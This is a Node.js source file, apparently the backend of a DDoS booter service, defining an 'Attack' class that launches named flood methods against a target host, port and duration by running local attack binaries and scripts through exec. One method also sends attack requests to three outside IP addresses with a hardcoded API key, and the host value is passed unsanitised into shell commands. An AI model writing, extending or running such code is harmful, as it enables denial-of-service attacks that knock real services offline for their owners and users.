const { all, get } = require("axios");
const {
    exec
} = require('child_process');
class Attack {
    static async send(host, port, time, method) {
        switch(method.toLowerCase()) {
            case "ds-std":
                all([
                    exec(`cd Method && ./STD ${host} ${port} ${time}`)
                ]);
                console.log(`New attack | Method : ${method}, Attacking -> ${host}:${port}`)
                break;
            case "ds-kill":
                all([
                    exec(`cd Method && ./SCP-KILL ${host} ${port} ${time}`)
                ]);
                console.log(`New attack | Method : ${method}, Attacking -> ${host}:${port}`)
                break;
            case "ds-tls":
                    all([
                        exec(`cd Method && node TLSv2 ${host} ${time} 64 3`)
                    ]);
                    console.log(`New attack | Method : ${method}, Attacking -> ${host}:${port}`)
                    break;
            case "ds-ovh":
                all([
                    exec(`cd Method && ./OVH ${host} ${port} ${time}`)
                ]);
                console.log(`New attack | Method : ${method}, Attacking -> ${host}:${port}`)
                break;
            case "ds-mesh":
                all([
                    exec(`cd Method && node mesh3l.js ${host} ${port} ${time}`)
                ]);
                console.log(`New attack | Method : ${method}, Attacking -> ${host}:${port}`)
                break;
            case "ds-http":
                all([
                    exec(`cd Method && node raw.js ${host} ${time}`),
                    get(`http://20.82.138.32/api?key=dark-666-p&host=${host}&port=${port}&time=${time}&method=${method}`), 
                    get(`http://20.54.80.4/api?key=dark-666-p&host=${host}&port=${port}&time=${time}&method=${method}`), 
		            get(`http://20.5.40.28/api?key=dark-666-p&host=${host}&port=${port}&time=${time}&method=${method}`)
                    
                ]);
                console.log(`New attack | Method : ${method}, Attacking -> ${host}`)
                break;
            case "ds-httpsv2":
                all([
                    exec(`cd Mehod && node rand.js ${host} ${time}`)
                ])
                console.log(`New Attack | Method ${method}, Attacking -> ${host}`)
                break;
            case "stop":
                all([
                    exec(`pkill ${host} -f`)
                ]);
                console.log(`Stoped Attack For ${host}`)
                break;
        }
    }
}

module.exports = Attack;
